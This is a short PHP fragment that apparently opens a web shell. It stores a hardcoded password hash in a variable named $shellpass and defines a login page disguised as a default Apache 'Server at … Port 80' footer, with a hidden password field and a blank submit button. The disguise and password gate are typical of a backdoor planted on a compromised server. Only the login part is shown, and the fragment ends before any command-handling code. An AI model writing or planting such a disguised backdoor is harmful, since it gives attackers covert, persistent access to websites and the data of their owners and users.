<?php
$shellpass = "057c60340cd14a3ffa2bfb7cfbd7f88d"; // hxc
@session_start();
function Login() {
?>
<html>
	...
	<hr>
	<form method=post>
	<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80<center><input type=password name=pass><input type=submit value=''></center></address>
	</form>
	</body>
</html>
